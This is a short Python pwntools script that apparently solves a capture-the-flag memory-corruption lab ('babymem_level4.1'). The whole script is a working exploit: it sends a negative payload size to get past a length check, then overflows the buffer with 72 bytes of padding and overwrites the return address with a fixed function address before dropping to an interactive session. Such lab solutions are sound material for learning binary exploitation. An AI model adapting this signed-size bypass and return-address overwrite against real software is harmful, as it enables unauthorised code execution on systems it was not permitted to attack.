from pwn import *

p = process('/challenge/babymem_level4.1')

p.recvuntil('Payload size:')
p.sendline(b'-1')

payload = b'a' * 72 + p64(0x401b01) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

